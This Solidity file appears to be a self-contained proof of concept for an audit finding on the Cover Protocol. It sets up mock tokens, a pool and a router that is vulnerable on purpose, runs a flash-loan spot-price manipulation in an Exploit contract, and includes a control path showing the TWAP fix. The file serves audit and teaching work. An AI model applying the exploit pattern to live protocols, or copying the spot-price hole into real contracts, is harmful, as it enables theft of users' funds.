// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Cover Protocol peripheral — flash-loan spot manipulation in one transaction
    (MixBytes, finding #28662).
    SYNTHETIC reduction of CoverRouter / Rollover, which let any caller swap and
    move liquidity with no same-transaction guard. A constant-product pool is
    the manipulated venue. The router pays the spot reserve ratio.
    FIX the report gives: _preventSameTxOrigin, or read a TWAP / post-loan price.
    One transaction. run() does not warp. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public immutable minter;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    Token public immutable a;
    Token public immutable b;
    uint256 public reserveA;
    uint256 public reserveB;

    constructor(Token _a, Token _b) {
        a = _a;
        b = _b;
    }

    function seed(uint256 amountA, uint256 amountB) external {
        a.transferFrom(msg.sender, address(this), amountA);
        b.transferFrom(msg.sender, address(this), amountB);
        reserveA = amountA;
        reserveB = amountB;
    }

    function swapAforB(uint256 amountA) external returns (uint256 outB) {
        uint256 newA = reserveA + amountA;
        uint256 newB = (reserveA * reserveB) / newA;
        outB = reserveB - newB;
        reserveA = newA;
        reserveB = newB;
        a.transferFrom(msg.sender, address(this), amountA);
        b.transfer(msg.sender, outB);
    }

    function swapBforA(uint256 amountB) external returns (uint256 outA) {
        uint256 newB = reserveB + amountB;
        uint256 newA = (reserveA * reserveB) / newB;
        outA = reserveA - newA;
        reserveA = newA;
        reserveB = newB;
        b.transferFrom(msg.sender, address(this), amountB);
        a.transfer(msg.sender, outA);
    }
}

contract Router {
    Token public immutable a;
    Pool public immutable pool;
    /// Pre-loan fair price, 1 A per 1 B. Not updated inside the flash loan.
    uint256 public twapPrice = 1 ether;

    constructor(Token _a, Pool _pool) {
        a = _a;
        pool = _pool;
    }

    function buyAtSpot(uint256 bAmount) external returns (uint256 paid) {
        uint256 reserveA = pool.reserveA();
        uint256 reserveB = pool.reserveB();
        // @> VULN: pays the spot reserve ratio inside the same tx as a flash-loan swap; no TWAP and no same-tx origin guard
        // FIX: require(block.number > _lastSwapBlock[tx.origin]) or pay twapPrice / the post-loan price
        uint256 price = reserveA * 1 ether / reserveB;
        paid = bAmount * price / 1 ether;
        Token(address(pool.b())).transferFrom(msg.sender, address(this), bAmount);
        a.transfer(msg.sender, paid);
    }

    function buyAtTwap(uint256 bAmount) external returns (uint256 paid) {
        paid = bAmount * twapPrice / 1 ether;
        Token(address(pool.b())).transferFrom(msg.sender, address(this), bAmount);
        a.transfer(msg.sender, paid);
    }

    function quoteTwap(uint256 bAmount) external view returns (uint256) {
        return bAmount * twapPrice / 1 ether;
    }
}

interface IFlash {
    function onFlash(uint256 amount) external;
}

contract Lender {
    Token public immutable a;

    constructor(Token _a) {
        a = _a;
    }

    function flash(address borrower, uint256 amount) external {
        a.transfer(borrower, amount);
        IFlash(borrower).onFlash(amount);
        a.transferFrom(borrower, address(this), amount);
    }
}

contract Exploit is IFlash {
    uint256 public constant FLASH = 3_000 ether;
    uint256 public constant SELL_B = 20 ether;
    uint256 public constant SPOT_PAID = 320 ether;
    uint256 public constant TWAP_PAID = 20 ether;
    uint256 public constant PROFIT = 299591836734693877552;

    Token public a;
    Token public b;
    Pool public pool;
    Router public router;
    Lender public lender;
    uint256 public spotPaid;
    uint256 public profit;
    bool public useTwap;

    constructor() {
        a = new Token("Token A", "TKA");
        b = new Token("Token B", "TKB");
        pool = new Pool(a, b);
        router = new Router(a, pool);
        lender = new Lender(a);
        a.mint(address(this), 1_000 ether);
        b.mint(address(this), 1_000 ether);
        a.mint(address(router), 1_000 ether);
        a.mint(address(lender), FLASH);
        a.approve(address(pool), type(uint256).max);
        b.approve(address(pool), type(uint256).max);
        a.approve(address(lender), type(uint256).max);
        b.approve(address(router), type(uint256).max);
        pool.seed(1_000 ether, 1_000 ether);
    }

    function run() external {
        useTwap = false;
        uint256 beforeBal = a.balanceOf(address(this));
        lender.flash(address(this), FLASH);
        profit = a.balanceOf(address(this)) - beforeBal;
        uint256 fair = router.quoteTwap(SELL_B);
        require(spotPaid == SPOT_PAID, "spot payment");
        require(fair == TWAP_PAID, "twap quote");
        require(profit == PROFIT, "attacker profit");
        require(int256(profit) - int256(spotPaid - fair) < 0, "twap would still profit");
    }

    /// Same flash loan and same pool trades. The router pays the stored TWAP.
    /// The round trip then loses the AMM rounding, so the profit is gone.
    function runControl() external {
        useTwap = true;
        // Dust so the unprofitable round trip can still repay the flash loan.
        a.mint(address(this), 1 ether);
        uint256 beforeBal = a.balanceOf(address(this));
        lender.flash(address(this), FLASH);
        uint256 afterBal = a.balanceOf(address(this));
        require(afterBal < beforeBal, "twap path still profited");
        profit = 0;
    }

    function onFlash(uint256 amount) external {
        require(msg.sender == address(lender), "lender");
        pool.swapAforB(amount);
        if (useTwap) {
            spotPaid = router.buyAtTwap(SELL_B);
        } else {
            spotPaid = router.buyAtSpot(SELL_B);
        }
        uint256 leftover = b.balanceOf(address(this));
        pool.swapBforA(leftover);
    }
}
